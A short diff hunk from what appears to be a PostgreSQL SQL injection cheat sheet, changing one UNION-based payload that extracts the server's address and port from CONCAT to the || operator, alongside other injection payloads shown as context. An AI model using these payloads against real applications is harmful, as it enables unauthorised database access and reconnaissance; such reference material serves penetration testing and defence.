@@ -67,7 +67,7 @@ SELECT current_setting('data_directory');
 ' UNION SELECT NULL,inet_server_port()::text,NULL--
 
 -- Combined extraction
-' UNION SELECT NULL,CONCAT(inet_server_addr()::text,':',inet_server_port()::text),NULL--
+' UNION SELECT NULL,inet_server_addr()::text||':'||inet_server_port()::text,NULL--
 ```
 
 ### Operating System Information
